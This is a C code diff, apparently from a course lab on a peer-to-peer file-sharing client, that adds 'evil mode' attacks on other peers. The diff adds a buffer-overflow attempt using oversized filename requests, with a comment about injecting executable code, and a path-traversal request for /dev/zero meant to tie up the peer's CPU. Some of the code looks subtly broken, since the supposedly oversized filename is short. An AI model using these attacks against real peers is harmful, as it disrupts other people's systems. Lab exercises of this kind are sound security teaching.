@@ -567,13 +567,31 @@ static void task_download(task_t *t, task_t *tracker_task)
 	osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
 
 	// 3B Evil mode 1
-	// Instead of reading and copying, we are continuously writing bad data over peer's file. 
+	// Instead of reading and copying, we attack the peer's buffer by continuesly requesting with a bad file name that's too large. 
+	// We could potentially insert executable code into the buffer that the further tamer with the system.
 	if (evil_mode == 1)
 	{
-		while (write(t->peer_fd, "bad_data", 8) > 0) continue;
-		message("* Target Peer's disk is now full.");
+		int i;
+		char bad_file_name[FILENAMESIZ*10];
+
+		strncpy(bad_file_name, "/dev/urandom", FILENAMESIZ*10-1);
+		
+		while (osp2p_writef(t->peer_fd, "GET %s OSP2P", bad_file_name) < 0) continue;
+		message("* Target Peer's buffer rejected final request.");
 
 		//now attack other peer's with the same file. 
+		goto try_again;
+	}
+
+	// 3B Evil mode 3
+	// This attack attempts to download files outside of the current directory 
+	// In this case we try to access /dev/zero, which will cause the peer to get stuck in write loops and consuming CPU time. 
+	// Other absolute paths can be made if we first download directory information to access files. 
+	if (evil_mode == 3)
+	{
+		char absolute_path[FILENAMESIZ*3] = "/dev/zero";
+		osp2p_writef(t->peer_fd, "GET %s OSP2P", absolute_path);
+
 		goto try_again;
 	}
 
